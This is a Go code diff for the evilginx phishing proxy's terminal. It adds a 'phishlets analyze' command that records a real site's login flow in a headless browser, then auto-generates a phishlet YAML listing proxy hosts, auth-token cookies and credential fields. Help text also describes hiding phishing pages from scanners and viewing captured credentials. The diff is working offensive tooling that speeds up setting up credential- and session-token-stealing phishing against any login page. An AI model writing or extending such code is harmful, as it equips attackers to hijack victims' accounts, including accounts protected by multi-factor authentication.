@@ -35,26 +35,32 @@ const (
 )
 
 type Terminal struct {
-	rl        *readline.Instance
-	completer *readline.PrefixCompleter
-	cfg       *Config
-	crt_db    *CertDb
-	p         *HttpProxy
-	db        *database.Database
-	hlp       *Help
-	developer bool
-	puppet    *PuppetManager
+	rl            *readline.Instance
+	completer     *readline.PrefixCompleter
+	cfg           *Config
+	crt_db        *CertDb
+	p             *HttpProxy
+	db            *database.Database
+	hlp           *Help
+	developer     bool
+	puppet        *PuppetManager
+	analyzer      *Analyzer
+	phishletsDir  string
 }
 
-func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool, puppet *PuppetManager) (*Terminal, error) {
+func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool, puppet *PuppetManager, phishletsDir string) (*Terminal, error) {
 	var err error
 	t := &Terminal{
-		cfg:       cfg,
-		crt_db:    crt_db,
-		p:         p,
-		db:        db,
-		developer: developer,
-		puppet:    puppet,
+		cfg:          cfg,
+		crt_db:       crt_db,
+		p:            p,
+		db:           db,
+		developer:    developer,
+		puppet:       puppet,
+		phishletsDir: phishletsDir,
+	}
+	if puppet != nil {
+		t.analyzer = NewAnalyzer(puppet)
 	}
 
 	t.createHelp()
@@ -1188,6 +1194,11 @@ func (t *Terminal) handlePuppet(args []string) error {
 func (t *Terminal) handlePhishlets(args []string) error {
 	pn := len(args)
 
+	// Handle analyze subcommand (any arg count)
+	if pn >= 1 && args[0] == "analyze" {
+		return t.handleAnalyze(args[1:])
+	}
+
 	if pn >= 3 && args[0] == "create" {
 		pl, err := t.cfg.GetPhishlet(args[1])
 		if err == nil {
@@ -1361,7 +1372,165 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			return nil
 		}
 	}
-	return fmt.Errorf("usage: phishlets [hostname|enable|disable|hide|unhide|get-hosts|domain|proxy] <name> (see: help phishlets)")
+	return fmt.Errorf("usage: phishlets [hostname|enable|disable|hide|unhide|get-hosts|domain|proxy|analyze] <name> (see: help phishlets)")
+}
+
+func (t *Terminal) handleAnalyze(args []string) error {
+	cyan := color.New(color.FgCyan)
+	higreen := color.New(color.FgHiGreen)
+	yellow := color.New(color.FgYellow)
+	_ = cyan
+	_ = higreen
+	_ = yellow
+
+	if t.analyzer == nil {
+		return fmt.Errorf("analyzer not available (puppet system not initialized)")
+	}
+
+	if len(args) == 0 {
+		// Show all active analyzer sessions
+		sessions := t.analyzer.GetActiveSessions()
+		if len(sessions) == 0 {
+			log.Info("no active analyzer sessions")
+			log.Info("start one with: %s", cyan.Sprint("phishlets analyze <login_url>"))
+			return nil
+		}
+		for _, s := range sessions {
+			log.Info("[%d] %s — %s (duration: %s)", s.Id, s.TargetURL, s.Status, time.Since(s.StartTime).Round(time.Second))
+		}
+		return nil
+	}
+
+	switch args[0] {
+	case "stop":
+		// Stop the most recent active session (or specific ID if given)
+		var targetId int
+		if len(args) >= 2 {
+			id, err := strconv.Atoi(args[1])
+			if err != nil {
+				return fmt.Errorf("invalid session ID: %s", args[1])
+			}
+			targetId = id
+		} else {
+			// Find the most recent recording session
+			sessions := t.analyzer.GetActiveSessions()
+			found := false
+			for _, s := range sessions {
+				if s.Status == "recording" {
+					targetId = s.Id
+					found = true
+				}
+			}
+			if !found {
+				return fmt.Errorf("no active analyzer session to stop")
+			}
+		}
+
+		sess, err := t.analyzer.StopAnalysis(targetId)
+		if err != nil {
+			return err
+		}
+
+		log.Info("analyzing captured data...")
+		result := t.analyzer.Analyze(sess)
+
+		// Generate YAML
+		yaml := t.analyzer.GenerateYAML(result)
+
+		// Determine phishlet name from landing domain
+		name := "analyzed"
+		if result.LandingDomain != "" {
+			parts := strings.Split(result.LandingDomain, ".")
+			if len(parts) >= 2 {
+				name = parts[len(parts)-2]
+			}
+		}
+
+		// Allow user to override name if provided
+		if len(args) >= 3 {
+			name = args[2]
+		}
+
+		// Save to phishlets directory
+		savePath := ""
+		if t.phishletsDir != "" {
+			savePath = filepath.Join(t.phishletsDir, name+".yaml")
+		} else {
+			savePath = name + ".yaml"
+		}
+
+		err = os.WriteFile(savePath, []byte(yaml), 0644)
+		if err != nil {
+			log.Error("failed to save phishlet: %v", err)
+			log.Info("generated YAML:\n%s", yaml)
+			return nil
+		}
+
+		log.Success("phishlet saved to: %s", higreen.Sprint(savePath))
+		log.Info("reload evilginx to load the new phishlet, then:")
+		log.Info("  %s", cyan.Sprint("phishlets enable "+name))
+
+		// Show summary
+		log.Info("")
+		log.Info("analysis summary:")
+		log.Info("  proxy_hosts:  %d domains", len(result.ProxyHosts))
+		log.Info("  auth_tokens:  %d groups", len(result.AuthTokens))
+		log.Info("  credentials:  %d fields detected", len(result.Credentials))
+		log.Info("  login path:   %s%s", result.LoginDomain, result.LoginPath)
+		log.Info("  sub_filters:  %d rules", len(result.SubFilters))
+
+		if len(result.Credentials) == 0 {
+			log.Warning("no credential fields were auto-detected — you may need to edit the YAML manually")
+			log.Info("  look for the username and password field names in the target login form's HTML")
+		}
+
+		return nil
+
+	case "status":
+		var targetId int
+		if len(args) >= 2 {
+			id, err := strconv.Atoi(args[1])
+			if err != nil {
+				return fmt.Errorf("invalid session ID: %s", args[1])
+			}
+			targetId = id
+		} else {
+			sessions := t.analyzer.GetActiveSessions()
+			found := false
+			for _, s := range sessions {
+				if s.Status == "recording" {
+					targetId = s.Id
+					found = true
+				}
+			}
+			if !found {
+				return fmt.Errorf("no active analyzer session")
+			}
+		}
+
+		sess, ok := t.analyzer.GetSession(targetId)
+		if !ok {
+			return fmt.Errorf("analyzer session %d not found", targetId)
+		}
+
+		summary := t.analyzer.GetStatusSummary(sess)
+		t.output("\n%s\n", summary)
+		return nil
+
+	default:
+		// args[0] is the URL to analyze
+		targetURL := args[0]
+		sess, err := t.analyzer.StartAnalysis(targetURL)
+		if err != nil {
+			return err
+		}
+
+		log.Success("analyzer session [%d] started for: %s", sess.Id, targetURL)
+		log.Info("open the puppet control URL in your browser to interact with the login page")
+		log.Info("when you've completed the login flow, run: %s", cyan.Sprint("phishlets analyze stop"))
+		log.Info("to check progress: %s", cyan.Sprint("phishlets analyze status"))
+		return nil
+	}
 }
 
 func (t *Terminal) handleLures(args []string) error {
@@ -1888,7 +2057,8 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("domain", readline.PcItemDynamic(t.phishletPrefixCompleter)),
-			readline.PcItem("proxy", readline.PcItemDynamic(t.phishletPrefixCompleter))))
+			readline.PcItem("proxy", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("analyze", readline.PcItem("stop"), readline.PcItem("status"))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
 	h.AddSubCommand("phishlets", []string{"create"}, "create <phishlet> <child_name> <key1=value1> <key2=value2>", "create child phishlet from a template phishlet with custom parameters")
@@ -1902,6 +2072,9 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
+	h.AddSubCommand("phishlets", []string{"analyze"}, "analyze <login_url>", "start recording a login flow — opens a headless browser you control via the puppet UI")
+	h.AddSubCommand("phishlets", []string{"analyze", "stop"}, "analyze stop", "stop recording and generate a phishlet YAML from captured data")
+	h.AddSubCommand("phishlets", []string{"analyze", "status"}, "analyze status", "show live capture stats (domains, cookies, credential fields)")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
